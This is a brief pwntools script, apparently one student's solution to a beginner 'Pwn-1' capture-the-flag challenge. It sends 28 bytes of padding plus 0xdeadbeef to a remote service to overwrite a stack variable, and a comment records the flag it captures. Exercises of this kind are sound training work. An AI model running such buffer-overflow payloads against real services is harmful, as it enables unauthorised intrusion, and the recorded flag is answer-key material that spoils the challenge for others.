# 張元_Pwn-1
from pwn import *

r = remote('140.110.112.218', 6125)
r.recvuntil("?")

r.sendline(b'a'*28 + p32(0xdeadbeef)) # MyFirstCTF{L0c41_vARiaBl3_0n_Th3_sT4cK?!}

r.interactive()